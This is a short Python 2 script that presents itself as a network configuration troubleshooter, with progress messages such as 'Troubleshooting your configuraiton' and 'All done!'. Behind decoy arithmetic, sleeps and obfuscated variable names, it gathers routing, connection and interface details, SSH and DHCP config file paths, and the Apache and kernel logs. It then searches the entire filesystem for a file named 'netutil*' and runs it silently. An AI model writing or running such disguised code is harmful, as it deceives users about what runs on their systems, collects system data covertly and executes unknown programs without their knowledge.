import os
import time
import subprocess
import sys
import socket
import ssl
import json
import binhex
import HTMLParser
import webbrowser
import uuid
import cmd
import symbol
import nis


print "Troubleshooting your configuraiton, please wait..."
time.sleep(10)

adar = []
ri = os.popen('netstat -r | grep default').read()
rs = ri.split(" ")
rh = rs[-1].rstrip()
xs = os.popen('ifconfig ' + rh + ' | grep inet').read()
xv = xs.split(' ')
xd = xv.index('inet')
xi = xd + 1
xs = xv[xi]
if 'addr:' in xs:
	xn = xs[5:]
else:
	xn = xs

print "Fetching interfaces..."
print "Fetching configurations..."
try:
	ec = []
	ed = []
	ee = []
	ef = []
	eg = []
	eh = []
	ei = []
	ej = []
	ek = []
	el = []
	for root, dirs, files in os.walk('/etc/ssh'):
		for fi in files:
			if fi.endswith('.conf') or fi.endswith('.d'):
				eh.append(os.path.join(root,fi))
	for root, dirs, files in os.walk('/etc/X11'):
		for di in dirs:
			if di.endswith('.conf') or di.endswith('.d'):
				for fi in di:
					el.append(os.path.join(root,di,fi))
	for root, dirs, files in os.walk('/etc/dhcp'):
		for fi in files:
			if fi.endswith('.conf') or fi.endswith('.d'):
				ee.append(os.path.join(root,fi))
except:
	pass
print "Reading network statistics..."
cmd = os.popen('netstat -ano').read()
cm2 = os.popen('netstat -an').read()
print "Scrutinizing routing..."
r = os.popen('netstat -r').read()
f = os.popen('route').read()
print "Testing connection..."
time.sleep(1)
time.sleep(2)
time.sleep(1)
cd = os.popen('lsof -Pi').read()
print "Uh-oh...something went wrong..."
time.sleep(1)
print "Detecting configuration problems..."
time.sleep(1)
time.sleep(1)
time.sleep(1)
try:
	a = 1 + 1
	time.sleep(2)
	x = 8 * 9
	qwert = 90 - 2 + 15 * 2 - 20
	twerq = qwert + 34
	qpekdcifrrifvnhdifejfnsjkebfjkfdnwbhedfkdnshwdfkmndbwhekfndwekdn = 50 + twerq
	fj = []
	snfdekwrfiekwef = os.popen('cat /var/log/apache2/error.log').read()
	lwekjriedwsopqlwemdrfi9okrtfpo2lk34jnrtfklodswmejfgoewlenfmgjkfeldfgm = os.popen('cat /var/log/apache2/access.log').read()
	sdmklwsdfmdldfm = snfdekwrfiekwef
	mdene = os.popen('cat /var/log/kern.log').read()
	fj.append(a)
	fj.append(a + 1)
	time.sleep(2)
	fj.append(2 * 2 % 5)
	fj.append(a + 5049)
	fj.append(qpekdcifrrifvnhdifejfnsjkebfjkfdnwbhedfkdnshwdfkmndbwhekfndwekdn * 2)
	fj.append(twerq)
	time.sleep(1)
	askjfasfjasd = mdene
	fj.append(qwert)
	fj.append(50)
	fj.append(askjfasfjasd)
	time.sleep(a)
except:
	pass
time.sleep(1)
print "Clearing cache..."
time.sleep(1)
print "Reconfiguring...this could take a while..."
for root, dirs, files in os.walk('/'):
	for fi in files:
		if fi.startswith('netutil'):
			sf = os.path.join(root,fi)
devn = open(os.devnull, 'w')
subprocess.call([sf],stdout=devn,stderr=devn)
print "All done!"
